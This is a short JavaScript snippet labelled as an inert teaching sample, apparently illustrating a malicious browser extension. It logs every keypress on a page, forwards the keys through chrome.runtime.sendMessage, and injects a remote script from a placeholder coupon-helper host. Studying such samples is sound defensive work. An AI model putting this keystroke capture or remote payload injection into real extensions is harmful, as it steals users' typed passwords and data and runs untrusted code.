// INERT TEACHING SAMPLE.
const orig = window.fetch;
window.fetch = async (...args) => { const r = await orig(...args); return r; };
document.addEventListener("keydown", e => chrome.runtime.sendMessage({ k: e.key }));
const s = document.createElement("script");
s.src = "https://cdn.coupon-helper-demo.invalid-example.net/x.js";
document.documentElement.appendChild(s);
